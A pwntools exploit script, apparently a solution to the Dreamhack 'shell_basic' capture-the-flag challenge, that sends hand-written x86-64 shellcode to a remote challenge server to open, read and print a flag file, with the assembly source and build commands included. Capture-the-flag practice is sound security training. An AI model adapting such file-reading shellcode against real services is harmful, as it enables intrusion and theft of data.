from pwn import *

context.arch = "amd64"
context.log_level = "DEBUG"

r = remote("host3.dreamhack.games", 12970)

payload = b""
payload += b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67"
payload += b"\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50"
payload += b"\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48"
payload += b"\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8"
payload += b"\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7"
payload += b"\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f"
payload += b"\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xec\x30\xba"
payload += b"\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf"
payload += b"\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"

"""  Assembly Code

> nasm -f elf64 shell_basic.asm
> objcopy --dump-section .text=shell_basic.bin shell_basic.o
> xxd -p shell_basic.bin | tr -d '\n' | fold -w2 | awk '{print "\\x" $0}' | tr -d '\n'

section .text
global _start
_start:
	push 0x00
	mov rax, 0x676e6f6f6f6f6f6f
	push rax
	mov rax, 0x6c5f73695f656d61
	push rax
	mov rax, 0x6e5f67616c662f63
	push rax
	mov rax, 0x697361625f6c6c65
	push rax
	mov rax, 0x68732f656d6f682f
	push rax
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx 
	mov rax, 0x02
	syscall 

	mov rdi, rax
	mov rsi, rsp
	sub rsi, 0x30
	mov rdx, 0x30
	mov rax, 0x00
	syscall

	mov rdi, 1
	mov rax, 0x01
	syscall
"""


r.sendlineafter(b"shellcode: ", payload)
res = r.recvall()
print(res)